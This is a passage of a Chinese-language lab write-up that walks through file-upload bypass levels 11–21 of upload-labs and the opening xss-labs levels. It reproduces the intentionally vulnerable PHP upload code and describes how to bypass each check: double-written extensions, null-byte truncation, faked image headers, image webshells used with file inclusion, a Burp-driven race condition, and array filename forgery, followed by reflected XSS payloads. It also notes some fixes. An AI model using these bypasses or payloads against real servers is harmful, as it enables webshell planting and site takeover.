34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;);//获取文件扩展名 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name;//拼接上传路径和文件名 if (move_uploaded_file($temp_file, $img_path)) {//将临时文件移动到目标路径 $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 拼接路径原理解释：\n举个生活化的例子：\n假设你有一个快递柜（上传目录），地址是 /小区A/3号楼/快递柜/。\n你规定所有快递必须放进这个柜子里。\n但攻击者耍了个花招：\n他们在快递单上写 ../../小区大门/保安室/危险包裹。\n快递员（代码）看到这个地址后，会这样拼接路径：/小区A/3号楼/快递柜/../../小区大门/保安室/危险包裹\n这里的 ../ 相当于“后退一步”：\n从 快递柜 退到 3号楼（路径变成 /小区A/3号楼/） 再退到 小区A（路径变成 /小区A/） 最后拼上 小区大门/保安室/危险包裹，结果就是：\n/小区A/小区大门/保安室/危险包裹 于是，攻击者的危险包裹被放到了保安室（敏感目录），而不是快递柜！\n为什么会有这种问题？\n代码的路径拼接逻辑：\n你的代码直接信任用户输入的文件名，把上传目录（UPLOAD_PATH）和文件名（$file_name）拼在一起。\n如果文件名里藏了 ../，路径就会被“绕”到其他目录。 操作系统对路径的解析：\n操作系统会自动解析 ../，把它当成“返回上级目录”的指令。\n比如：\n/var/www/uploads/../../ → 实际上等于 /var/（退了两层） 攻击者会做什么？\n假设你的网站根目录是 /var/www/html/，攻击者可能：\n上传一个文件名 ../../html/shell.php 你的代码拼接后路径变成：\n/var/www/uploads/../../html/shell.php → 实际是 /var/www/html/shell.php 攻击者通过访问 http://你的网站.com/shell.php，就能执行任意代码（比如删除数据库、窃取数据）。 如何彻底解决？\n禁止文件名中出现路径符号：\n用 basename() 函数，直接砍掉所有路径部分，只保留纯文件名。 php\r1 $file_name = basename($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); // 无论用户输入什么路径，只取最后的文件名 效果：\n- 用户输入 `../../evil.php` → 处理后变成 `evil.php` - 路径固定为 `UPLOAD_PATH/evil.php` 强制白名单文件类型：\n只允许图片等安全类型（比如 .jpg, .png），禁止 .php 等可执行文件。 php\r1 2 3 4 $allow_ext = [\u0026#39;.jpg\u0026#39;, \u0026#39;.png\u0026#39;, \u0026#39;.gif\u0026#39;]; // 只允许这些扩展名 if (!in_array($file_ext, $allow_ext)) { die(\u0026#34;禁止上传！\u0026#34;); } 重命名上传的文件：\n用随机字符串重命名文件（如 5f3d2a1.jpg），让攻击者无法预测文件路径。 php\r1 2 $new_name = md5(uniqid()) . $file_ext; // 生成随机文件名 $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; . $new_name; 拼接路径，在文件名称后面加入. .\nPass-11_双写绕过 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;,\u0026#34;ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = str_ireplace($deny_ext,\u0026#34;\u0026#34;, $file_name); $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } str_ireplace 函数是 PHP 中的一个不区分大小写的字符串替换函数。它用于在给定的字符串（或字符串数组）中，将所有匹配的搜索字符串替换为指定的替换字符串，且不区分大小写。\n在这个代码中，会将黑名单里的文件名全部替换为空，但只替换一次，所以可以用双写绕过。\nPass-12_00截断绕过（POST） 第12关开始进入白名单\n前提条件：\n1.php版本小于5.3\n2.配置文件中php.ini中的magic_quotes_gpc = On需要修改为magic_quotes_gpc = Off，修改之后记得保存并重启\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = $_GET[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; } } 00截断原理：\n关键使用了空字符\n在url编码中空字符为%00\n当传入文件时，用空字符截断文件名变成攻击性文件\n例如：上传example.php%00.jpg 后在 URL 解码后会变成 example.php\\0.jpg，当系统处理时example.php\\0.jpg 会被文件系统保存为 example.php，从而达成目的。\n进行更改\n上传成功后复制链接到蚁剑\n将%之后的去除\nPass-13_00截断绕过（GET) php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = $_POST[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#34;上传失败\u0026#34;; } } else { $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; } } 原理：\n代码漏洞：\nphp\r1 $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); 通过strrpos查找文件名中的最后一个.的位置来获取文件拓展名\n那么我们将文件名构造为 webshell.php .jpg（注意中间的空格），然后在十六进制（HEX）视图中将空格（ASCII 20）改为空字节（HEX 00）。最终文件名变为 webshell.php\\x00.jpg（\\x00 表示空字节）。\n并且由于 PHP 在底层使用 C 字符串处理函数，当遇到空字节 \\x00 时，strrpos 会认为字符串在 \\x00 处结束。\n因此，原始文件名 webshell.php\\x00.jpg 会被截断为 webshell.php。\nbp抓包：\n在upload后添加文件名webshell.php并且在此文件名后添加空格，选中空格后，在右边的窗口将空格的HAX值（20）改为空字符的HAX值（00）\n将文件后缀名改为白名单上的\n上传成功后复制链接到蚁剑，删除%以及后边的东西\n连接成功\n对比 GET 和 POST 在 00 截断绕过中的区别\n对比项 GET 请求 POST 请求 参数位置 参数附加在 URL 中（如 ?file=test.php%00.jpg）。 参数在 HTTP 请求体中（如表单字段 filename=\u0026quot;test.php%00.jpg\u0026quot;）。 常见漏洞场景 路径遍历、文件包含（如 include($_GET['file'])）。 文件上传、路径拼接（如 move_uploaded_file($tmp, $_POST['path'].$filename)）。 绕过示例 http://example.com?file=shell.php%00.jpg → 截断为 shell.php。 上传文件名 shell.php\\x00.jpg → 保存为 shell.php。 防御难度 较难触发（需服务器允许 URL 中包含未编码的 %00）。 较易触发（请求体中的空字节可能直接被处理）。 实际利用频率 较低（现代框架/服务器默认过滤 URL 中的空字节）。 较高（文件上传功能中更常见，且空字节可能绕过扩展名检查）。 Pass-14_图片马+文件包含漏洞 首先分析代码：\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 function getReailFileType($filename){ $file = fopen($filename, \u0026#34;rb\u0026#34;);//使用fopen()函数以二进制模式（\u0026#34;rb\u0026#34;）打开指定的文件 $bin = fread($file, 2); //只读2字节，这里只读取两个字节是因为不同的文件类型通常在其头部有独特的标识符（也称为“魔术数字”），这些标识符足以区分常见的文件格式 fclose($file); $strInfo = @unpack(\u0026#34;C2chars\u0026#34;, $bin); //将读取的2个字节解包为两个无符号字符（C2chars 表示解包为2个字符）；@ 用于抑制可能的错误（如文件不足2字节时解包失败） $typeCode = intval($strInfo[\u0026#39;chars1\u0026#39;].$strInfo[\u0026#39;chars2\u0026#39;]); //将两个字节拼接成一个整数 $fileType = \u0026#39;\u0026#39;; switch($typeCode){ //匹配文件类型 case 255216: $fileType = \u0026#39;jpg\u0026#39;; break; case 13780: $fileType = \u0026#39;png\u0026#39;; break; case 7173: $fileType = \u0026#39;gif\u0026#39;; break; default: $fileType = \u0026#39;unknown\u0026#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_type = getReailFileType($temp_file); if($file_type == \u0026#39;unknown\u0026#39;){ $msg = \u0026#34;文件未知，上传失败！\u0026#34;; }else{ $img_path = UPLOAD_PATH.\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#34;上传出错！\u0026#34;; } } } 文件头字节与文件类型的对应关系：\n1.文字头：文字头是文件开头的几个字节，用来标识文件类型\nJPEG 文件的前两个字节是 FF D8。\nPNG 文件的前两个字节是 89 50。\nGIF 文件的前两个字节是 47 49。（十六进制）\n2.字节（Byte）：计算机中的最小存储单位\n十六进制：FF、D8\n十进制： 255、216\n二进制： 11111111、11011000\n以jpg文件类型举例：\njpg文件前俩个字节是FF D8， 代码中通过 unpack(\u0026quot;C2chars\u0026quot;, $bin) 将文件头的两个字节解包，解包后$strInfo['chars1'] 是第一个字节（FF，即 255），$strInfo['chars2'] 是第二个字节（D8，即 216）。\n通过 intval($strInfo['chars1'].$strInfo['chars2']) 将两个十进制数拼接成一个整数，得到 255216。最后根据switch($typeCode)函数匹配到jpg文件。\n因此我们更改上传的文件的文件头：\n在最前面输入两个任意字母，方便后面修改\n使用010editor打开，打开十六进制\n将61,61改为FF,D8\n保存后上传\n上传后蚁剑还不能链接\n接下来要用到文件包含漏洞\n文件包含漏洞全面详解-CSDN博客\n点击题目中的文件包含漏洞链接\n在新标签页打开图片找到图片链接\n记下文件名\nplain\r1 upload/5420250209113757.jpg 文件包含漏洞：\nplain\r1 ?file=upload/+文件名称 plain\r1 ?file=upload/5020250209113022.jpg 页面没有报错，就可以用这个url通过蚁剑连接\n.png后缀：\n.gif后缀：\n三种后缀都上传成功才算过关！\nPass-15_图片马 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function isImage($filename){ $types = \u0026#39;.jpeg|.png|.gif\u0026#39;; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)\u0026gt;=0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $res = isImage($temp_file); if(!$res){ $msg = \u0026#34;文件未知，上传失败！\u0026#34;; }else{ $img_path = UPLOAD_PATH.\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#34;上传出错！\u0026#34;; } } } 这一关中出现了getimagesize（）函数，getimagesize() 是 PHP 中一个用于获取图像文件信息的函数，它可以返回图像的尺寸、类型、MIME 类型等信息。\n因此我们需要一张图片，将一句话木马写入图片里\n随便打开一张图片：\n将一句话木马写入最后，保存后上传。\n上传成功后同pass-14\n.png\nPass-16-图片马 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \u0026#34;gif\u0026#34;; break; case IMAGETYPE_JPEG: return \u0026#34;jpg\u0026#34;; break; case IMAGETYPE_PNG: return \u0026#34;png\u0026#34;; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $res = isImage($temp_file); if(!$res){ $msg = \u0026#34;文件未知，上传失败！\u0026#34;; }else{ $img_path = UPLOAD_PATH.\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#34;上传出错！\u0026#34;; } } } 代码中要求开启php_exlf\n接下来同pass15\nPass-17_二次渲染 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $filetype = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;]; $tmpname = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $target_path=UPLOAD_PATH.\u0026#39;/\u0026#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\u0026#34;.\u0026#34;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \u0026#34;jpg\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/jpeg\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \u0026#34;该文件不是jpg格式的图片！\u0026#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.jpg\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;上传出错！\u0026#34;; } }else if(($fileext == \u0026#34;png\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/png\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \u0026#34;该文件不是png格式的图片！\u0026#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.png\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;上传出错！\u0026#34;; } }else if(($fileext == \u0026#34;gif\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/gif\u0026#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \u0026#34;该文件不是gif格式的图片！\u0026#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.gif\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026#34;上传出错！\u0026#34;; } }else{ $msg = \u0026#34;只允许上传后缀为.jpg|.png|.gif的图片文件！\u0026#34;; } } 二次渲染是将原来的图片内容转换为另一种内容，这些内容有相同之处也有不同之处，所以我们在相同之处加入一句话木马即可\n首先随便上传一张图片并找到，\n使用010比较俩个文件\n插入一句话木马\nPass-18_条件竞争 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_ext = substr($file_name,strrpos($file_name,\u0026#34;.\u0026#34;)+1); $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; unlink($upload_file); } }else{ $msg = \u0026#39;上传出错！\u0026#39;; } } 这个代码中先上传后检查，于是我们可以利用上传到删除之间的时间去访问我们上传的文件，这就是条件竞争（满足特定环境条件）。\n更改一下php文件\n发送PHP代码，并且用BP抓包\n直接发送到Intruder模块进行暴力重发\n发送过来后直接点击右侧清除（clean），然后点击上方的Payloads,按照如下设置\n接下来开始攻击，用另一个浏览器访问生成文件地址\nPass-19-条件竞争+图片马 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 //index.php $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { require_once(\u0026#34;./myupload.php\u0026#34;); $imgFileName =time(); $u = new MyUpload($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;], $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;size\u0026#39;],$imgFileName); $status_code = $u-\u0026gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-\u0026gt;cls_upload_dir . $u-\u0026gt;cls_file_rename_to; break; case 2: $msg = \u0026#39;文件已经被上传，但没有重命名。\u0026#39;; break; case -1: $msg = \u0026#39;这个文件不能上传到服务器的临时文件存储目录。\u0026#39;; break; case -2: $msg = \u0026#39;上传失败，上传目录不可写。\u0026#39;; break; case -3: $msg = \u0026#39;上传失败，无法上传该类型文件。\u0026#39;; break; case -4: $msg = \u0026#39;上传失败，上传的文件过大。\u0026#39;; break; case -5: $msg = \u0026#39;上传失败，服务器已经存在相同名称文件。\u0026#39;; break; case -6: $msg = \u0026#39;文件无法上传，文件不能复制到目标目录。\u0026#39;; break; default: $msg = \u0026#39;未知错误！\u0026#39;; break; } } //myupload.php class MyUpload{ ...... ...... ...... var $cls_arr_ext_accepted = array( \u0026#34;.doc\u0026#34;, \u0026#34;.xls\u0026#34;, \u0026#34;.txt\u0026#34;, \u0026#34;.pdf\u0026#34;, \u0026#34;.gif\u0026#34;, \u0026#34;.jpg\u0026#34;, \u0026#34;.zip\u0026#34;, \u0026#34;.rar\u0026#34;, \u0026#34;.7z\u0026#34;,\u0026#34;.ppt\u0026#34;, \u0026#34;.html\u0026#34;, \u0026#34;.xml\u0026#34;, \u0026#34;.tiff\u0026#34;, \u0026#34;.jpeg\u0026#34;, \u0026#34;.png\u0026#34; ); ...... ...... ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-\u0026gt;isUploadedFile(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } $ret = $this-\u0026gt;setDir( $dir ); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } $ret = $this-\u0026gt;checkExtension(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } $ret = $this-\u0026gt;checkSize(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-\u0026gt;cls_file_exists == 1 ){ $ret = $this-\u0026gt;checkFileExists(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-\u0026gt;move(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-\u0026gt;cls_rename_file == 1 ){ $ret = $this-\u0026gt;renameFile(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-\u0026gt;resultUpload( \u0026#34;SUCCESS\u0026#34; ); } ...... ...... ...... }; 19关与18关相比，加入了图片马\n在图片末尾加入木马\n上传图片并用bp抓包\n接下来同18关\nPass-20 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); $file_name = $_POST[\u0026#39;save_name\u0026#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = \u0026#39;上传出错！\u0026#39;; } }else{ $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } Pass-21 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //检查MIME $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;禁止上传该类型文件!\u0026#34;; }else{ //检查文件名 $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { $msg = \u0026#34;禁止上传该后缀文件!\u0026#34;; }else{ $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026#34;文件上传成功！\u0026#34;; $is_upload = true; } else { $msg = \u0026#34;文件上传失败！\u0026#34;; } } } }else{ $msg = \u0026#34;请选择要上传的文件！\u0026#34;; } 如果传入的内容是数组，那他不会进行检查，同时把数组中的第一个元素和最后一个元素通过点拼接成一个完整的文件名。\n如果传入的内容不是数组，他会以点为分割，把名字和后缀分开，形成一个数组，数组中的第一个元素为文件名字，第二个元素为后缀名，再接着，它会对你数组中最后一个元素（也就是第二个元素后缀名）进行判断，如果不符合白名单上的内容，那就直接禁止了，如果允许，他会让数组中的第一个元素与最后一个元素通过点来结合，形成一个完整的文件名。\n一切的根源都是保存的名称是不是数组，所以我们只需要伪造一个数组\n首先上传php文件\n修改这一段\n更改完之后放包，上传成功\n使用蚁剑链接\n2、xss-labs XSS 的核心原理是 攻击者通过输入恶意脚本，利用网站未过滤的漏洞，让浏览器执行这些脚本，从而实施攻击。\nlevel1_直接注入 查看源码：\n当调用 alert() 时，实际上会执行以下操作：\n弹出一个确认对话框，显示消息“完成的不错！”。 用户点击确认后，页面会重定向到 level2.php，并且传递一个查询参数 keyword=test。 直接在地址栏输入\nplain\r1 name=\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; level2_”\u0026gt;闭合绕过 先插入js尝试\n这里属于特殊符号被实体转义，所以\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt;没有被实体转移\n可以看到\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;被嵌套到value属性中，所以我们需要闭合input标签。\nplain\r1 2 payload： \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; level3_onfocus和οnclick html\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt;\u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;content-type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; \u0026lt;script\u0026gt; window.alert = function() { confirm(\u0026#34;完成的不错！\u0026#34;); window.location.href=\u0026#34;level4.php?keyword=try harder!\u0026#34;; } \u0026lt;/script\u0026gt; 